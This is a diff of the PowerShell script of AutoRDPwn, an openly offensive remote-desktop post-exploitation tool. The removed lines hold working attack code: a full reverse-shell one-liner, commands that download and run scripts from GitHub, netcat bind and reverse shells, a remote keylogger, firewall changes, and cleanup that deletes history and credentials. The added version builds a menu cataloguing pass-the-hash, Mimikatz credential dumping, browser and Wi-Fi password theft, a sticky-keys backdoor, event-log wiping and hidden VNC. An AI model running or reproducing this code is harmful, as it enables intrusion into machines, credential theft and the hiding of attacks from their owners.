-netsh advfirewall firewall add rule name="Powershell Web Server" dir=in action=allow protocol=TCP localport=8080 2>&1> $null ; Write-Host
-Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray
-Write-Host "Powershell Web Server -->` " -NoNewLine -ForegroundColor Green ; Write-Host http://$using:computer`:8080 -ForegroundColor Blue
-Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray ; Write-Host }
-(New-Object -Com Shell.Application).Open("http://$computer`:8080") ; invoke-command -session $RDP[0] -scriptblock ${function:Start-WebServer}}
-
-if ($metasploit){ Write-Host ; Write-Host "[+] Loading Metasploit Reverse Shell.." -ForegroundColor Blue ; Write-Host ; Start-Sleep -milliseconds 600
-Write-Host "[!] Waiting until Metasploit Reverse Shell is working.." -ForegroundColor Red ; Start-Sleep -milliseconds 600
-$metashell = "`$client = New-Object System.Net.Sockets.TCPClient('$metahost',$metaport);`$stream = `$client.GetStream();[byte[]]`$bytes = 0..65535|%{0};while((`$i = `$stream.Read(`$bytes, 0, `$bytes.Length)) -ne 0){;`$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(`$bytes,0, `$i);`$sendback = (iex `$data 2>&1 | Out-String );`$sendback2  = `$sendback + 'PS ' + (pwd).Path + '> ' ;`$sendbyte = ([text.encoding]::ASCII).GetBytes(`$sendback2);`$stream.Write(`$sendbyte,0,`$sendbyte.Length);`$stream.Flush()};`$client.Close()"
-invoke-command -session $RDP[0] -scriptblock { Invoke-Expression $using:metashell ; Start-Sleep -milliseconds 600 }}
-
-if ($netcat -in 'local'){ $netcatpsone = if($local){ Import-Module .\Resources\Scripts\Invoke-PowerShellTcp.ps1 } else { (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/Resources/Scripts/Invoke-PowerShellTcp.ps1')}
-invoke-command -session $RDP[0] -scriptblock { Set-Content -Value $using:netcatpsone -Path Invoke-PowerShellTcp.ps1 ; Import-Module .\Invoke-PowerShellTcp.ps1
-Write-Host ; netsh advfirewall firewall delete rule name="Powershell Remote Control Application" 2>&1> $null
-netsh advfirewall firewall add rule name="Powershell Remote Control Application" dir=in action=allow protocol=TCP localport=$using:ncport 2>&1> $null
-Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray
-Write-Host "$using:txt51 -->` " -NoNewLine -ForegroundColor Green ; Write-Host "nc $using:computer $using:ncport" -ForegroundColor Blue
-Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray ; Write-Host
-Invoke-PowerShellTcp -Bind -Port $using:ncport ; del .\Invoke-PowerShellTcp.ps1 }}
- 
-if ($netcat -in 'remote'){ $netcatpsone = if($local){ Import-Module .\Resources\Scripts\Invoke-PowerShellTcp.ps1 } else { (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/Resources/Scripts/Invoke-PowerShellTcp.ps1')}
-invoke-command -session $RDP[0] -scriptblock { Set-Content -Value $using:netcatpsone -Path Invoke-PowerShellTcp.ps1 ; Import-Module .\Invoke-PowerShellTcp.ps1 ; Write-Host
-Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray
-Write-Host "$using:txt52 -->` " -NoNewLine -ForegroundColor Green ; Write-Host "nc -l $using:ncport" -ForegroundColor Blue
-Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray ; Write-Host ; Start-Sleep -milliseconds 3000
-Invoke-PowerShellTcp -Reverse -IPAddress $using:ipadress -Port $using:ncport ; del .\Invoke-PowerShellTcp.ps1 }}
-
-if ($getkeys){ if($local){ Import-Module .\Resources\Scripts\Invoke-Keylogger.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/Resources/Scripts/Invoke-Keylogger.ps1')}
-invoke-command -session $RDP[0] -scriptblock { Set-Content -Path $env:temp\dllhost.exe -Value $using:Content1 -Encoding Byte ; Set-Content -Path $env:temp\svchost.exe -Value $using:Content2 -Encoding Byte
-(Get-Process | ? {$_.Path -like "*Local\Temp\svchost.exe"}).kill() ; Remove-Item $env:LOCALAPPDATA\config.dat ; cd $env:temp ; .\dllhost.exe nomsg explorer.exe "$pwd\svchost.exe" ; Write-Host
-Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray
-Write-Host "              Remote Keylogger " -NoNewLine -ForegroundColor Green ; Write-Host "| " -NoNewLine -ForegroundColor Gray ; Write-Host "Press 'Ctrl+C' to stop              " -ForegroundColor Blue
-Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray ; Write-Host
-try { while($true) { Get-Content -wait $env:localappdata\config.dat }} finally { Write-Host ; Write-Host "[!] Ctrl+C pressed, exiting.." -ForegroundColor Red ; Start-Sleep -milliseconds 600 }}}
-
-if ($smbshell){ Write-Host ; if($local){ Import-Module .\Resources\Scripts\Invoke-PipeShell.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/Resources/Scripts/Invoke-PipeShell.ps1')}
-Invoke-PipeShell -mode client -server $computer -aeskey AutoRDPwn_AESKey -i -pipe "NamedPipeStream" -timeout 120 }
-
-if ($revshell){ Write-Host ; Write-Host "[+] Downloading HTTP-RevShell Server.." -ForegroundColor Blue
-if($local){ Import-Module .\Resources\Scripts\Invoke-RevShellServer.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/Resources/Scripts/Invoke-RevShellServer.ps1')}
-if($local){ Import-Module .\Resources\Scripts\Invoke-WebRev.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/Resources/Scripts/Invoke-WebRev.ps1')}
-invoke-command -session $RDP[0] -scriptblock { Start-Job -ScriptBlock { $webrevscript = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("$using:webrev64")) ; Set-Content -Value $webrevscript -Path Invoke-WebRev.ps1
-Import-Module .\Invoke-WebRev.ps1 ; Invoke-WebRev -ip $using:webrevip -port $using:webrevport } 2>&1> $null }
-try { Clear-Host ; .\server.exe $webrevip $webrevport ; del .\server.exe } finally { Write-Host ; Write-Host "[!] Ctrl+C pressed, exiting.." -ForegroundColor Red ; Start-Sleep -milliseconds 600 ; del .\server.exe }}
-
-if ($remoteforward){ invoke-command -session $RDP[0] -scriptblock { netsh interface portproxy add v4tov4 listenport=$using:rlport listenaddress=$using:rlhost connectport=$using:rrport connectaddress=$using:rrhost }}
-if ($console){ $PlainTextPassword = ConvertFrom-SecureToPlain $password ; Clear-Host ; Write-Host ">> $txt39 <<" ; Write-Host ; WinRS -r:$computer -u:$user -p:$PlainTextPassword "cmd" }}
-else { Write-Host ; Write-Host "[!] $txt40" -ForegroundColor Red ; Start-Sleep -milliseconds 600 } if($tsfail) { Write-Host ; Write-Host "[!] $txt40" -ForegroundColor Red ; Start-Sleep -milliseconds 600 }}
-
-if ($noclean -or $nogui) { $null } else { Write-Host ; Write-Host "[!] $txt75" -ForegroundColor Red ; Start-Sleep -milliseconds 600
-if ($sticky) { $sid = (Get-CimInstance Win32_Process | Where-Object { $_.CommandLine -like '*mstsc*admin*' }).ProcessId ; Wait-Process -Id $sid } 
-elseif ($vncserver) { $sid = (Get-CimInstance Win32_Process | Where-Object { $_.CommandLine -like '*VNCViewer.exe*AutoRDPwn*' }).ProcessId ; Wait-Process -Id $sid } 
-else { $sid = (Get-CimInstance Win32_Process | Where-Object { $_.CommandLine -like '*mstsc*shadow*' }).ProcessId ; Wait-Process -Id $sid }
-if ($attack) { Start-Sleep -milliseconds 600 ; Write-Host ; Write-Host "[+] $txt77" -ForegroundColor Blue ; Start-Sleep -milliseconds 1500 }
-if (!$local) { $PScript = $MyInvocation.MyCommand.Definition ; Remove-Item $PScript } ; del (Get-PSReadlineOption).HistorySavePath ; Remove-Exclusions 2>&1> $null ; Set-Clipboard $null 2>&1> $null ; cmdkey /del $computer 2>&1> $null
-Write-Host ; Write-Host "[i] $txt76" -ForegroundColor Green ; Start-Sleep -milliseconds 600 }
+﻿
+param(
+    [switch]$noadmin,
+    [switch]$nogui,
+    [string]$lang = '',
+    [string]$option = '',
+    [string]$shadow = '',
+    [switch]$createuser,
+    [switch]$noclean
+)
+
+$ErrorActionPreference = 'Continue'
+$ProgressPreference = 'SilentlyContinue'
+Set-StrictMode -Off
+try { [Console]::OutputEncoding = [System.Text.Encoding]::UTF8 } catch { }
+
+$script:ARVersion = '5.2'
+$script:ARIsWindows = ([Environment]::OSVersion.Platform -eq [PlatformID]::Win32NT)
+$script:ARNoAdmin = [bool]$noadmin
+$script:ARNoGui = [bool]$nogui
+$script:ARNoClean = [bool]$noclean
+$script:ARCreateUser = [bool]$createuser
+$script:ARLanguageArgument = [string]$lang
+$script:ARShadowPreference = ([string]$shadow).Trim().ToLowerInvariant()
+$script:ARInvokedFromOption = -not [string]::IsNullOrWhiteSpace($option)
+$script:AROptionValue = ([string]$option).Trim()
+$script:AROriginalLocation = (Get-Location).Path
+
+$script:ARLocal = $false
+$script:ARRoot = ''
+$candidates = New-Object System.Collections.Generic.List[string]
+if ($PSScriptRoot) { $candidates.Add($PSScriptRoot) }
+if ($MyInvocation.MyCommand.Path) { $candidates.Add((Split-Path -Parent $MyInvocation.MyCommand.Path)) }
+$candidates.Add((Get-Location).Path)
+foreach ($candidate in $candidates) {
+    if ([string]::IsNullOrWhiteSpace($candidate)) { continue }
+    if (Test-Path -LiteralPath (Join-Path $candidate 'Resources\Scripts')) {
+        $script:ARRoot = $candidate
+        $script:ARLocal = $true
+        break
+    }
+}
+if (-not $script:ARLocal) {
+    $script:ARRoot = Join-Path $env:TEMP 'AutoRDPwn'
+}
+$script:ARResources = Join-Path $script:ARRoot 'Resources'
+$script:ARTools = Join-Path $script:ARResources 'Tools'
+foreach ($directory in @($script:ARRoot, $script:ARResources, $script:ARTools)) {
+    if (-not (Test-Path -LiteralPath $directory)) {
+        New-Item -ItemType Directory -Path $directory -Force | Out-Null
+    }
+}
+$script:ARRepository = 'https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master'
+
+try {
+    [System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy()
+    [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
+} catch { }
+try {
+    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
+} catch { }
+
+function Test-ARHeaderAdmin {
+    try {
+        $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
+        $principal = New-Object Security.Principal.WindowsPrincipal($identity)
+        return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+    } catch { return $false }
+}
+
+if ($script:ARIsWindows -and -not $script:ARNoAdmin -and -not (Test-ARHeaderAdmin)) {
+    $launcher = ''
+    if ($PSCommandPath) { $launcher = $PSCommandPath }
+    elseif ($MyInvocation.MyCommand.Path) { $launcher = $MyInvocation.MyCommand.Path }
+    if ([string]::IsNullOrWhiteSpace($launcher)) {
+        Write-Host '[!] Administrator privileges are required.' -ForegroundColor Red
+        exit 1
+    }
+    $forward = New-Object System.Collections.Generic.List[string]
+    if ($script:ARNoGui) { $forward.Add('-nogui') }
+    if (-not [string]::IsNullOrWhiteSpace($script:ARLanguageArgument)) { $forward.Add('-lang'); $forward.Add($script:ARLanguageArgument) }
+    if (-not [string]::IsNullOrWhiteSpace($script:AROptionValue)) { $forward.Add('-option'); $forward.Add($script:AROptionValue) }
+    if (-not [string]::IsNullOrWhiteSpace($script:ARShadowPreference)) { $forward.Add('-shadow'); $forward.Add($script:ARShadowPreference) }
+    if ($script:ARCreateUser) { $forward.Add('-createuser') }
+    if ($script:ARNoClean) { $forward.Add('-noclean') }
+    $argumentList = @('-sta', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', ('"' + $launcher + '"'))
+    foreach ($argument in $forward) { $argumentList += $argument }
+    Write-Host '[i] Requesting administrator privileges...' -ForegroundColor Green
+    try {
+        $startArgs = @{
+            FilePath = 'powershell.exe'
+            Verb = 'RunAs'
+            ArgumentList = $argumentList
+            ErrorAction = 'Stop'
+        }
+        if ($script:ARLocal) { $startArgs['WorkingDirectory'] = $script:ARRoot }
+        Start-Process @startArgs | Out-Null
+    } catch {
+        Write-Host '[!] Elevation cancelled. Run this terminal as Administrator, or launch with -noadmin.' -ForegroundColor Red
+        Start-Sleep -Seconds 3
+        exit 1
+    }
+    exit
+}
+
+try {
+    $Host.UI.RawUI.WindowTitle = 'AutoRDPwn - v5.2 - by @JoelGMSec'
+    $Host.UI.RawUI.BackgroundColor = 'Black'
+    $Host.UI.RawUI.ForegroundColor = 'Gray'
+} catch { }
+
+$script:ARLocaleName = 'English'
+$script:ARStrings = @{}
+$script:ARFallbackStrings = @{}
+$script:ARTarget = @{
+    Computer   = 'localhost'
+    User       = ''
+    Password   = ''
+    Hash       = ''
+    Domain     = ''
+    AttackerIP = ''
+    Mode       = 'control'
+}
+$script:ARStatus = @{ Text = 'Ready'; Kind = 'Info' }
+$script:ARScroll = 0
+$script:ARSelectedId = ''
+$script:ARFilter = ''
+$script:ARSessionState = 'not connected'
+$script:ARTestMode = $false
+$script:ARNoClear = $false
+$script:ARTestWidth = 0
+$script:ARTestHeight = 0
+$script:ARTestBuffer = New-Object System.Collections.Generic.List[string]
+$script:ARLegacyMap = @{
+    '11' = '101'
+    '12' = '201'
+    '13' = '301'
+    '14' = '401'
+    '15' = '501'
+    '16' = '601'
+    '17' = '701'
+}
+
+function Import-ARLanguage {
+    param(
+        [Parameter(Mandatory = $true)][string]$Path,
+        [switch]$AsFallback
+    )
+    if (-not (Test-Path -LiteralPath $Path)) {
+        throw "Language file not found: $Path"
+    }
+    $captured = & {
+        . $Path
+        Get-Variable -Name 'txt*', 'Pwn*' -ErrorAction SilentlyContinue
+    }
+    $strings = @{}
+    foreach ($item in $captured) {
+        if ($null -ne $item -and $item.Name) {
+            $strings[$item.Name] = [string]$item.Value
+        }
+    }
+    if ($AsFallback) {
+        $script:ARFallbackStrings = $strings
+    }
+    else {
+        $script:ARStrings = $strings
+    }
+}
+
+function Get-ARText {
+    param(
+        [Parameter(Mandatory = $true)][string]$Key,
+        [string]$Default = ''
+    )
+    if ($script:ARStrings.ContainsKey($Key)) {
+        return $script:ARStrings[$Key]
+    }
+    if ($script:ARFallbackStrings.ContainsKey($Key)) {
+        return $script:ARFallbackStrings[$Key]
+    }
+    return $Default
+}
+
+function Set-ARLanguageName {
+    param([Parameter(Mandatory = $true)][string]$Name)
+    $script:ARLocaleName = $Name
+}
+
+function Set-ARStatus {
+    param(
+        [Parameter(Mandatory = $true)][string]$Text,
+        [ValidateSet('Info', 'Ok', 'Warn', 'Error')][string]$Kind = 'Info'
+    )
+    $script:ARStatus = @{ Text = $Text; Kind = $Kind }
+}
+
+function Set-ARSessionState {
+    param([string]$State)
+    if ($null -eq $State -or $State -eq '') {
+        $script:ARSessionState = 'not connected'
+    }
+    else {
+        $script:ARSessionState = $State
+    }
+}
+
+function Format-ARText {
+    param(
+        [AllowNull()][string]$Text,
+        [int]$MaxWidth
+    )
+    if ($MaxWidth -lt 1) { return '' }
+    if ($null -eq $Text) { return '' }
+    $flat = ($Text -replace '[\r\n\t]+', ' ').Trim()
+    if ($flat.Length -le $MaxWidth) { return $flat }
+    if ($MaxWidth -le 3) { return $flat.Substring(0, $MaxWidth) }
+    return $flat.Substring(0, $MaxWidth - 3) + '...'
+}
+
+function Get-ARWrappedLines {
+    param(
+        [AllowNull()][string]$Text,
+        [int]$Width,
+        [int]$MaxLines
+    )
+    $result = New-Object System.Collections.Generic.List[string]
+    if ($Width -lt 4 -or $MaxLines -lt 1) { return @() }
+    if ($null -eq $Text) { return @() }
+    $flat = ($Text -replace '\s+', ' ').Trim()
+    if ($flat -eq '') { return @() }
+    $words = $flat -split ' '
+    $line = ''
+    $truncated = $false
+    foreach ($word in $words) {
+        if ($word.Length -gt $Width) {
+            if ($line -ne '') {
+                $result.Add($line)
+                $line = ''
+                if ($result.Count -ge $MaxLines) { $truncated = $true; break }
+            }
+            $result.Add($word.Substring(0, $Width))
+            if ($result.Count -ge $MaxLines) { $truncated = $true; break }
+            continue
+        }
+        if ($line -eq '') {
+            $candidate = $word
+        }
+        else {
+            $candidate = $line + ' ' + $word
+        }
+        if ($candidate.Length -le $Width) {
+            $line = $candidate
+        }
+        else {
+            $result.Add($line)
+            if ($result.Count -ge $MaxLines) { $truncated = $true; break }
+            $line = $word
+        }
+    }
+    if ($result.Count -lt $MaxLines -and $line -ne '') {
+        $result.Add($line)
+    }
+    elseif ($line -ne '') {
+        $truncated = $true
+    }
+    if ($truncated -and $result.Count -gt 0) {
+        $last = $result[$result.Count - 1]
+        if ($last.Length -gt ($Width - 3)) {
+            $last = $last.Substring(0, $Width - 3)
+        }
+        $result[$result.Count - 1] = $last + '...'
+    }
+    return $result.ToArray()
+}
+
+function Get-ARConsoleWidth {
+    if ($script:ARTestMode -and $script:ARTestWidth -gt 0) { return $script:ARTestWidth }
+    $width = 100
+    try {
+        if ([Console]::WindowWidth -gt 0) { $width = [Console]::WindowWidth }
+    }
+    catch { }
+    if ($width -lt 60) { $width = 60 }
+    return $width
+}
+
+function Get-ARConsoleHeight {
+    if ($script:ARTestMode -and $script:ARTestHeight -gt 0) { return $script:ARTestHeight }
+    $height = 30
+    try {
+        if ([Console]::WindowHeight -gt 0) { $height = [Console]::WindowHeight }
+    }
+    catch { }
+    if ($height -lt 20) { $height = 20 }
+    return $height
+}
+
+function Clear-ARScreen {
+    if ($script:ARTestMode) { return }
+    if ($script:ARNoClear) { return }
+    Clear-Host
+}
+
+function Write-ARLine {
+    param(
+        [AllowEmptyString()][string]$Text = '',
+        [string]$Color = 'Gray',
+        [string]$Background = ''
+    )
+    if ($script:ARTestMode) {
+        $script:ARTestBuffer.Add($Text)
+        return
+    }
+    if ($Background -ne '') {
+        Write-Host $Text -ForegroundColor $Color -BackgroundColor $Background
+    }
+    else {
+        Write-Host $Text -ForegroundColor $Color
+    }
+}
+
+function Test-ARIsAdmin {
+    try {
+        $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
+        $principal = New-Object Security.Principal.WindowsPrincipal($identity)
+        return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+    }
+    catch {
+        return $false
+    }
+}
+
+function New-ARAction {
+    param(
+        [Parameter(Mandatory = $true)][string]$Id,
+        [Parameter(Mandatory = $true)][string]$Title,
+        [Parameter(Mandatory = $true)][string]$Description,
+        [Parameter(Mandatory = $true)][string]$Handler,
+        [bool]$NeedsTarget = $true,
+        [bool]$NeedsSession = $true
+    )
+    return [pscustomobject]@{
+        Kind         = 'Action'
+        Id           = $Id
+        Title        = $Title
+        Description  = $Description
+        Handler      = $Handler
+        NeedsTarget  = $NeedsTarget
+        NeedsSession = $NeedsSession
+    }
+}
+
+function New-ARGroup {
+    param([Parameter(Mandatory = $true)][string]$Title)
+    return [pscustomobject]@{
+        Kind  = 'Group'
+        Title = $Title
+    }
+}
+
+function Get-ARActionCatalog {
+    $items = New-Object System.Collections.Generic.List[object]
+
+    $items.Add((New-ARAction -Id '1' -Title 'PSexec (SMB)' -Description 'Copy and start the payload with PSexec over SMB, then open the shadow session.' -Handler 'Invoke-ARAttackPSexec' -NeedsSession $false))
+    $items.Add((New-ARAction -Id '2' -Title 'Pass the Hash (SMB)' -Description 'Authenticate with an NTLM hash through SMBExec and start the payload.' -Handler 'Invoke-ARAttackPassTheHash' -NeedsSession $false))
+    $items.Add((New-ARAction -Id '3' -Title 'Windows Management Instrumentation (WMI)' -Description 'Create the remote process through CIM/WMI with optional credentials.' -Handler 'Invoke-ARAttackWmi' -NeedsSession $false))
+    $items.Add((New-ARAction -Id '4' -Title 'Windows Remote Management (WinRM)' -Description 'Run the payload through a WinRM session with optional credentials.' -Handler 'Invoke-ARAttackWinRm' -NeedsSession $false))
+    $items.Add((New-ARAction -Id '5' -Title 'Windows Remote Assistance (WinRS)' -Description 'Run the payload with WinRS and then open the shadow session.' -Handler 'Invoke-ARAttackWinRs' -NeedsSession $false))
+    $items.Add((New-ARAction -Id '6' -Title 'Local Session Hijacking (TSCon)' -Description 'Attach the current console to another local session with tscon.' -Handler 'Invoke-ARAttackTscon' -NeedsTarget $false -NeedsSession $false))
+    $items.Add((New-ARAction -Id '7' -Title 'Remote Desktop Execution (RDP)' -Description 'Start the payload through SharpRDP and then open the shadow session.' -Handler 'Invoke-ARAttackRdp' -NeedsSession $false))
+    $items.Add((New-ARAction -Id '8' -Title (Get-ARText 'txt121' 'Quick Screen (Stealth VNC)') -Description (Get-ARText 'txt122' 'Watch or control the target screen without the user noticing') -Handler 'Invoke-ARAttackQuickScreen'))
+
+    $items.Add((New-ARGroup -Title (Get-ARText 'txt17' 'Remote Access')))
+    $items.Add((New-ARAction -Id '101' -Title 'Named Pipe Remote Shell (SMB)' -Description (Get-ARText 'txt95' 'Remote shell through a named pipe over SMB port 445') -Handler 'Invoke-ARModulePipeShell'))
+    $items.Add((New-ARAction -Id '102' -Title (Get-ARText 'txt39' 'Semi-interactive console (WinRS)') -Description (Get-ARText 'txt96' 'Remote console over WinRM port 5985 using direct PowerShell') -Handler 'Invoke-ARModuleWinRsConsole'))
+    $items.Add((New-ARAction -Id '103' -Title 'PowerShell HTTP-RevShell (HTTP/S)' -Description (Get-ARText 'txt97' 'Reverse shell that dials back over HTTP/S, crosses proxies') -Handler 'Invoke-ARModuleHttpRevShell'))
+    $items.Add((New-ARAction -Id '104' -Title (Get-ARText 'txt51' 'Netcat console (direct connection)') -Description (Get-ARText 'txt99' 'The target listens and you connect to it') -Handler 'Invoke-ARModuleNetcatDirect'))
+    $items.Add((New-ARAction -Id '105' -Title (Get-ARText 'txt52' 'Netcat console (reverse connection)') -Description (Get-ARText 'txt98' 'You listen and the target connects back to you') -Handler 'Invoke-ARModuleNetcatReverse'))
+
+    $items.Add((New-ARGroup -Title (Get-ARText 'txt50' 'Passwords and hashes')))
+    $items.Add((New-ARAction -Id '201' -Title (Get-ARText 'txt9' 'Extract local hashes with Mimikatz') -Description (Get-ARText 'txt100' 'Dump local account password hashes from the SAM registry hive') -Handler 'Invoke-ARModuleMimikatzSam'))
+    $items.Add((New-ARAction -Id '202' -Title (Get-ARText 'txt10' 'Extract system passwords with Mimikatz') -Description (Get-ARText 'txt101' 'Extract plaintext passwords from the memory of authenticated processes') -Handler 'Invoke-ARModuleMimikatzLogon'))
+    $items.Add((New-ARAction -Id '203' -Title (Get-ARText 'txt49' 'Obtain browsers passwords with SharpWeb') -Description (Get-ARText 'txt102' 'Recover passwords saved in Chrome, Firefox and other browsers') -Handler 'Invoke-ARModuleSharpWeb'))
+    $items.Add((New-ARAction -Id '204' -Title (Get-ARText 'txt59' 'Recover Wi-Fi passwords') -Description (Get-ARText 'txt103' 'Show the keys of saved WiFi networks in clear text') -Handler 'Invoke-ARModuleWifiKeys'))
+
+    $items.Add((New-ARGroup -Title (Get-ARText 'txt125' 'Networking / Pivoting')))
+    $items.Add((New-ARAction -Id '301' -Title 'TCP Port Scan' -Description (Get-ARText 'txt104' 'Multi-threaded TCP port scan of the target') -Handler 'Invoke-ARModulePortScan' -NeedsSession $false))
+    $items.Add((New-ARAction -Id '302' -Title 'Native Port Forwarding' -Description (Get-ARText 'txt105' 'Forward ports with netsh, inbound locally or remote pivoting') -Handler 'Invoke-ARModulePortForward'))
+    $items.Add((New-ARAction -Id '303' -Title 'PowerShell Web Server' -Description (Get-ARText 'txt106' 'Serve files from the target with a PowerShell web server') -Handler 'Invoke-ARModuleWebServer'))
+    $items.Add((New-ARAction -Id '304' -Title 'Network Creds Scanner' -Description (Get-ARText 'txt107' 'Test a password or NTLM hash against a CIDR range via SMB/WMI') -Handler 'Invoke-ARModuleCredScan' -NeedsSession $false))
+
+    $items.Add((New-ARGroup -Title (Get-ARText 'txt126' 'Remote Desktop Forensics')))
+    $items.Add((New-ARAction -Id '401' -Title (Get-ARText 'txt11' 'Rebuild the image cache') -Description (Get-ARText 'txt129' 'Recover the RDP session history cached on this computer') -Handler 'Invoke-ARModuleRdpCaching' -NeedsTarget $false -NeedsSession $false))
+    $items.Add((New-ARAction -Id '402' -Title (Get-ARText 'txt127' 'List local users and groups') -Description (Get-ARText 'txt109' 'List every user with SID, groups and last logon details') -Handler 'Invoke-ARModuleListUsers'))
+    $items.Add((New-ARAction -Id '403' -Title (Get-ARText 'txt128' 'Extract session credentials (SessionGopher)') -Description (Get-ARText 'txt110' 'Extract credentials stored by PuTTY, SuperPuTTY, FileZilla and WinSCP') -Handler 'Invoke-ARModuleSessionGopher'))
+
+    $items.Add((New-ARGroup -Title (Get-ARText 'txt64' 'Backdoors and persistence')))
+    $items.Add((New-ARAction -Id '501' -Title 'Sticky Keys Hacking' -Description (Get-ARText 'txt111' 'Replace sethc.exe so a SYSTEM console opens from the login screen') -Handler 'Invoke-ARModuleStickyKeys'))
+    $items.Add((New-ARAction -Id '502' -Title 'Metasploit Reverse Shell' -Description (Get-ARText 'txt112' 'Deploy a persistent Metasploit reverse shell on the target') -Handler 'Invoke-ARModuleMetasploit'))
+    $items.Add((New-ARAction -Id '503' -Title 'Remote Keylogger' -Description (Get-ARText 'txt113' 'Log every keystroke typed on the target console') -Handler 'Invoke-ARModuleKeylogger'))
+
+    $items.Add((New-ARGroup -Title (Get-ARText 'txt68' 'Privilege escalation')))
+    $items.Add((New-ARAction -Id '601' -Title (Get-ARText 'txt70' 'Get operating system information') -Description (Get-ARText 'txt114' 'Full enumeration of privesc surface and local misconfigurations') -Handler 'Invoke-ARModuleChachi'))
+    $items.Add((New-ARAction -Id '602' -Title (Get-ARText 'txt71' 'Search vulnerabilities with Sherlock') -Description (Get-ARText 'txt115' 'Scan the system for known kernel and service vulnerabilities') -Handler 'Invoke-ARModuleSherlock'))
+    $items.Add((New-ARAction -Id '603' -Title (Get-ARText 'txt130' 'Privilege escalation audit') -Description (Get-ARText 'txt116' 'Audit services, tasks, permissions and patches for escalation paths') -Handler 'Invoke-ARModulePrivescCheck'))
+
+    $items.Add((New-ARGroup -Title (Get-ARText 'txt69' 'Other modules')))
+    $items.Add((New-ARAction -Id '701' -Title (Get-ARText 'txt18' 'Deactivate system logs') -Description (Get-ARText 'txt117' 'Wipe event logs without stopping the EventLog service') -Handler 'Invoke-ARModulePhant0m'))
+    $items.Add((New-ARAction -Id '702' -Title (Get-ARText 'txt62' 'Remote VNC Server (legacy)') -Description (Get-ARText 'txt118' 'Open an invisible VNC to watch and control the target screen') -Handler 'Invoke-ARModuleVncServer'))
+    $items.Add((New-ARAction -Id '703' -Title (Get-ARText 'txt67' 'External script execution') -Description (Get-ARText 'txt119' 'Run any external PowerShell script or function on the target') -Handler 'Invoke-ARModuleExternalScript'))
+    $items.Add((New-ARAction -Id '704' -Title (Get-ARText 'txt79' 'Change user with RunAs') -Description (Get-ARText 'txt120' 'Validate credentials and launch processes as another user') -Handler 'Invoke-ARModuleRunAs' -NeedsTarget $false -NeedsSession $false))
+
+    return $items.ToArray()
+}
+
+function Get-ARActionById {
+    param([Parameter(Mandatory = $true)][string]$Id)
+    foreach ($item in Get-ARActionCatalog) {
+        if ($item.Kind -eq 'Action' -and $item.Id -eq $Id) {
+            return $item
+        }
+    }
+    return $null
+}
+
+function Get-ARFilteredCatalog {
+    param([string]$Filter = '')
+    $catalog = @(Get-ARActionCatalog)
+    if ($null -eq $Filter -or $Filter.Trim() -eq '') {
+        return $catalog
+    }
+    $needle = $Filter.Trim().ToLowerInvariant()
+    $result = New-Object System.Collections.Generic.List[object]
+    $pendingGroup = $null
+    $groupAdded = $false
+    foreach ($item in $catalog) {
+        if ($item.Kind -eq 'Group') {
+            $pendingGroup = $item
+            $groupAdded = $false
+            continue
+        }
+        $haystack = ($item.Id + ' ' + $item.Title + ' ' + $item.Description).ToLowerInvariant()
+        if ($haystack.Contains($needle)) {
+            if ($pendingGroup -and -not $groupAdded) {
+                $result.Add($pendingGroup)
+                $groupAdded = $true
+            }
+            $result.Add($item)
+        }
+    }
+    return $result.ToArray()
+}
+
+function Resolve-ARSelection {
+    param([string]$Selection)
+    $value = ''
+    if ($null -ne $Selection) { $value = $Selection.Trim() }
+    if ($value -eq '') { return '' }
+    $upper = $value.ToUpperInvariant()
+    if ($upper -in @('Q', 'QUIT', 'X', 'EXIT')) { return 'QUIT' }
+    if ($upper -in @('L', 'LANG', 'LANGUAGE')) { return 'LANGUAGE' }
+    if ($upper -in @('T', 'TARGET')) { return 'TARGET' }
+    if ($value -match '^1[1-7]$') {
+        $mapped = $script:ARLegacyMap[$value]
+        if ($mapped) { return 'ACTION:' + $mapped }
+        return ''
+    }
+    $action = Get-ARActionById $value
+    if ($action) { return 'ACTION:' + $action.Id }
+    return ''
+}
+
+function Move-ARSelection {
+    param([int]$Delta)
+    $rows = @(Get-ARFilteredCatalog -Filter $script:ARFilter | Where-Object { $_.Kind -eq 'Action' })
+    if ($rows.Count -eq 0) { return }
+    $ids = @($rows | ForEach-Object { $_.Id })
+    $index = [Array]::IndexOf($ids, $script:ARSelectedId)
+    if ($index -lt 0) { $index = 0 }
+    else { $index = $index + $Delta }
+    if ($index -lt 0) { $index = $ids.Count - 1 }
+    if ($index -ge $ids.Count) { $index = 0 }
+    $script:ARSelectedId = $ids[$index]
+}
+
+function Move-ARSelectionPage {
+    param([int]$Pages)
+    $rows = @(Get-ARFilteredCatalog -Filter $script:ARFilter | Where-Object { $_.Kind -eq 'Action' })
+    if ($rows.Count -eq 0) { return }
+    $ids = @($rows | ForEach-Object { $_.Id })
